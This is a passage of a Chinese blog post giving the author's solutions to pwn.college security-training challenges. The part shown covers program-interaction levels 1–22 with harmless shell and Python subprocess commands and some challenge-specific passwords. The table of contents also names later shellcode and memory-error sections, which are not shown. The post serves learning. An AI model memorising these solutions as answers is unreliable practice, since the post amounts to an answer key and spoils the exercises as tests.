<!doctype html><html lang=zh dir=ltr class=scroll-smooth data-default-appearance=light data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="zh"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>追本溯源：pwn.college 作业记录 &#183; Lab on Mercury</title><meta name=title content="追本溯源：pwn.college 作业记录 &#183; Lab on Mercury"><meta name=description content="Lab on Mercury"><link rel=canonical href=https://blog.sigmerc.top/posts/pwn-college/><link type=text/css rel=stylesheet href=/css/main.bundle.min.32ddf7dee8011260365c3436dd92254eeda3ec27bea2822527e6cb67f6ede1ff17904557445f0f6747a03b5aa59bbf754e43fc9b0c77b1cd957ef7061fd0c6d2.css integrity="sha512-Mt333ugBEmA2XDQ23ZIlTu2j7Ce+ooIlJ+bLZ/bt4f8XkEVXRF8PZ0egO1qlm791TkP8mwx3sc2VfvcGH9DG0g=="><script type=text/javascript src=/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1+ko+UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE+kxhPaP44V1nkaYuHY8umoPeUk8H+2ZrVho1A==" data-copy=Copy data-copied=Copied></script>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="追本溯源：pwn.college 作业记录"><meta property="og:description" content="时隔许久，我居然又得做 pwn 题了。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/posts/pwn-college/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-24T20:03:11+00:00"><meta property="article:modified_time" content="2022-06-23T14:51:02+08:00"><meta property="og:site_name" content="Lab on Mercury"><meta name=twitter:card content="summary"><meta name=twitter:title content="追本溯源：pwn.college 作业记录"><meta name=twitter:description content="时隔许久，我居然又得做 pwn 题了。"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"追本溯源：pwn.college 作业记录","headline":"追本溯源：pwn.college 作业记录","abstract":"\u003cp\u003e时隔许久，我居然又得做 pwn 题了。\u003c\/p\u003e","inLanguage":"zh","url":"https:\/\/blog.sigmerc.top\/posts\/pwn-college\/","author":{"@type":"Person","name":"Mercury"},"copyrightYear":"2022","dateCreated":"2022-02-24T20:03:11\u002b00:00","datePublished":"2022-02-24T20:03:11\u002b00:00","dateModified":"2022-06-23T14:51:02\u002b08:00","keywords":["Linux","C/C++","Python","整数溢出","栈漏洞"],"mainEntityOfPage":"true","wordCount":"3434"}]</script><meta name=author content="Mercury"><link href=mailto:signormercurio@gmail.com rel=me><link href=https://github.com/SignorMercurio rel=me><link href=https://t.me/m9r_at_tG rel=me></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0" href=#main-content><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden"><nav class="flex justify-between"><div><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentcolor" d="M112.1 454.3c0 6.297 1.816 12.44 5.284 17.69l17.14 25.69c5.25 7.875 17.17 14.28 26.64 14.28h61.67c9.438.0 21.36-6.401 26.61-14.28l17.08-25.68c2.938-4.438 5.348-12.37 5.348-17.7L272 415.1H112L112.1 454.3zM191.4.0132C89.44.3257 16 82.97 16 175.1c0 44.38 16.44 84.84 43.56 115.8 16.53 18.84 42.34 58.23 52.22 91.45.0313.25.0938.5166.125.7823h160.2c.0313-.2656.0938-.5166.125-.7823 9.875-33.22 35.69-72.61 52.22-91.45C351.6 260.8 368 220.4 368 175.1 368 78.61 288.9-.2837 191.4.0132zM192 96.01c-44.13.0-80 35.89-80 79.1.0 9.69-7.2 16.89-16 16.89S80 184.8 80 176c0-61.76 50.25-111.1 112-111.1 8.844.0 16 7.159 16 16S200.8 96.01 192 96.01z"/></svg></span><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" rel=me href=/>Lab on Mercury</a></div><ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row"><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts>文章</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/categories/ title=Categories>分类</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>标签</a></li><li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></li></ul></nav></header><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Lab on Mercury</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/pwn-college/>追本溯源：pwn.college 作业记录</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">追本溯源：pwn.college 作业记录</h1><div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-02-24 20:03:11 +0000 UTC">2022-02-24</time><span class="px-2 text-primary-500">&#183;</span><time datetime="2022-06-23 14:51:02 +0800 +0800">Updated: 2022-06-23</time></div><div class="my-1 text-xs text-neutral-500 dark:text-neutral-400"><a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">二进制安全</a>
<a href=/tags/linux/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">Linux</a>
<a href=/tags/c/c++/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">C/C++</a>
<a href=/tags/python/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">Python</a>
<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">整数溢出</a>
<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">栈漏洞</a></div></div></header><section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert"><div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last"><div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden"><details open class="mt-0 sideNav rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block sticky top-0 py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">Table of Contents</summary><div class="py-2 pr-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#embryoio-program-interaction>embryoio: Program Interaction</a><ul><li><a href=#1>1</a></li><li><a href=#2>2</a></li><li><a href=#3>3</a></li><li><a href=#4>4</a></li><li><a href=#5>5</a></li><li><a href=#6>6</a></li><li><a href=#7>7</a></li><li><a href=#8>8</a></li><li><a href=#9-14>9-14</a></li><li><a href=#15>15</a></li><li><a href=#16>16</a></li><li><a href=#17>17</a></li><li><a href=#18>18</a></li><li><a href=#19>19</a></li><li><a href=#20>20</a></li><li><a href=#21>21</a></li><li><a href=#22>22</a></li><li><a href=#23-28>23-28</a></li><li><a href=#29>29</a></li><li><a href=#30>30</a></li><li><a href=#31>31</a></li><li><a href=#32>32</a></li><li><a href=#33>33</a></li><li><a href=#34>34</a></li><li><a href=#35>35</a></li><li><a href=#36>36</a></li><li><a href=#37>37</a></li><li><a href=#38>38</a></li><li><a href=#39>39</a></li><li><a href=#40>40</a></li><li><a href=#41>41</a></li><li><a href=#42-47>42-47</a></li><li><a href=#48>48</a></li><li><a href=#49>49</a></li><li><a href=#50>50</a></li><li><a href=#51>51</a></li><li><a href=#52>52</a></li><li><a href=#53>53</a></li><li><a href=#54-59>54-59</a></li><li><a href=#60-65>60-65</a></li><li><a href=#66>66</a></li><li><a href=#67>67</a></li><li><a href=#68>68</a></li><li><a href=#69>69</a></li><li><a href=#70>70</a></li><li><a href=#71>71</a></li><li><a href=#72>72</a></li><li><a href=#73>73</a></li><li><a href=#74>74</a></li></ul></li><li><a href=#babysuid-program-misuse>babysuid: Program Misuse</a><ul><li><a href=#1-9>1-9</a></li><li><a href=#10>10</a></li><li><a href=#11>11</a></li><li><a href=#12>12</a></li><li><a href=#13>13</a></li><li><a href=#14>14</a></li><li><a href=#15-1>15</a></li><li><a href=#16-1>16</a></li><li><a href=#17-1>17</a></li><li><a href=#18-1>18</a></li><li><a href=#19-1>19</a></li><li><a href=#20-1>20</a></li><li><a href=#21-1>21</a></li></ul></li><li><a href=#embryoasm-assembly-refresher>embryoasm: Assembly Refresher</a><ul><li><a href=#1-1>1</a></li><li><a href=#2-1>2</a></li><li><a href=#3-1>3</a></li><li><a href=#4-1>4</a></li><li><a href=#5-1>5</a></li><li><a href=#6-1>6</a></li><li><a href=#7-1>7</a></li><li><a href=#8-1>8</a></li><li><a href=#9>9</a></li><li><a href=#10-1>10</a></li><li><a href=#11-1>11</a></li><li><a href=#12-1>12</a></li><li><a href=#13-1>13</a></li><li><a href=#14-1>14</a></li><li><a href=#15-2>15</a></li><li><a href=#16-2>16</a></li><li><a href=#17-2>17</a></li><li><a href=#18-2>18</a></li><li><a href=#19-2>19</a></li><li><a href=#20-2>20</a></li><li><a href=#21-2>21</a></li><li><a href=#22-1>22</a></li><li><a href=#23>23</a></li></ul></li><li><a href=#babyshell-shellcode-injection>babyshell: Shellcode Injection</a><ul><li><a href=#1-2>1</a></li><li><a href=#2-2>2</a></li><li><a href=#3-2>3</a></li><li><a href=#4-2>4</a></li><li><a href=#5-2>5</a></li><li><a href=#6-2>6</a></li><li><a href=#7-2>7</a></li><li><a href=#8-2>8</a></li><li><a href=#9-1>9</a></li><li><a href=#10-12>10-12</a></li><li><a href=#13-2>13</a></li><li><a href=#14-2>14</a></li></ul></li><li><a href=#babymem-memory-errors>babymem: Memory Errors</a><ul><li><a href=#10-2>1.0</a></li><li><a href=#11-2>1.1</a></li><li><a href=#20-3>2.0</a></li><li><a href=#21-3>2.1</a></li><li><a href=#30-1>3.0</a></li><li><a href=#31-1>3.1</a></li><li><a href=#40-1>4.0</a></li><li><a href=#50-1>5.0</a></li><li><a href=#60>6.0</a></li><li><a href=#70-1>7.0</a></li><li><a href=#80>8.0</a></li><li><a href=#90>9.0</a></li><li><a href=#100>10.0</a></li><li><a href=#110>11.0</a></li><li><a href=#120>12.0</a></li><li><a href=#130>13.0</a></li><li><a href=#140>14.0</a></li><li><a href=#150>15.0</a></li></ul></li><li><a href=#toddlerone-exploitation-scenarios>toddlerone: Exploitation Scenarios</a><ul><li><a href=#10-3>1.0</a></li><li><a href=#20-4>2.0</a></li><li><a href=#30-2>3.0</a></li><li><a href=#40-2>4.0</a></li><li><a href=#50-2>5.0</a></li><li><a href=#60-1>6.0</a></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><figure><img class="my-0 rounded-md" src=0.png alt=featuredImage></figure><p>时隔许久，我居然又得做 pwn 题了。</p><h2 id=embryoio-program-interaction class="relative group">embryoio: Program Interaction <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#embryoio-program-interaction aria-label=锚点>#</a></span></h2><h3 id=1 class="relative group">1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></div><h3 id=2 class="relative group">2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span>
</span></span><span class=line><span class=cl><span class=c1># ...</span>
</span></span><span class=line><span class=cl>jdlwsscr
</span></span></code></pre></div><h3 id=3 class="relative group">3 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> ommhsqruhu
</span></span></code></pre></div><h3 id=4 class="relative group">4 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#4 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nv>ykpoaq</span><span class=o>=</span>vpysbewhjx /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></div><h3 id=5 class="relative group">5 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#5 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> mvrlsgks &gt; /tmp/uulqde
</span></span><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> &lt; /tmp/uulqde
</span></span></code></pre></div><h3 id=6 class="relative group">6 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#6 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> &gt; /tmp/npruin
</span></span><span class=line><span class=cl>$ cat /tmp/npruin
</span></span></code></pre></div><h3 id=7 class="relative group">7 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#7 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ env -i /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></div><h3 id=8 class="relative group">8 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#8 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;/challenge/</span><span class=nv>$HOSTNAME</span><span class=s2>&#34;</span> &gt; ~/myscript.sh
</span></span><span class=line><span class=cl>$ bash ~/myscript.sh
</span></span></code></pre></div><h3 id=9-14 class="relative group">9-14 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#9-14 aria-label=锚点>#</a></span></h3><p>类似 1-7，但是使用了 8 的方法。</p><h3 id=15 class="relative group">15 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#15 aria-label=锚点>#</a></span></h3><p>运行 <code>ipython</code>，然后输入：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span></code></pre></div><p>16-21 均需要在 ipython 环境下执行。</p><h3 id=16 class="relative group">16 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#16 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>echo</span> ztrvysos &gt; input
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=17 class="relative group">17 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#17 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=n>binary</span><span class=p>,</span> <span class=s1>&#39;dynoamrymg&#39;</span><span class=p>])</span>
</span></span></code></pre></div><h3 id=18 class="relative group">18 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#18 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=nb>dict</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>,</span> <span class=n>iybxon</span><span class=o>=</span><span class=s2>&#34;lcoldvawsc&#34;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=19 class="relative group">19 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#19 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> dtzlsano &gt; /tmp/ofslag
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/ofslag&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=20 class="relative group">20 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/gicfkh&#34;</span><span class=p>,</span><span class=s2>&#34;w+&#34;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=21 class="relative group">21 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=nb>dict</span><span class=p>())</span>
</span></span></code></pre></div><h3 id=22 class="relative group">22 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#22 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
